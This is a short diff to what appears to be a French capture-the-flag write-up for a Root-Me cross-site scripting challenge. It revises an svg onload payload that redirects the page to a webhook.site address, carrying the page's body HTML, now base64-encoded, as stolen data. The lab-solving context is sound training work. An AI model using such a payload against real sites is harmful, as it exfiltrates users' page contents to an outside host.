@@ -110,6 +110,6 @@ Bon maintenant nous savons que l'ont veut récupérer les données qui se situe 
 Nouveau Payload
 
 ```html
-http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
+http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='//webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML))">
 ```
 
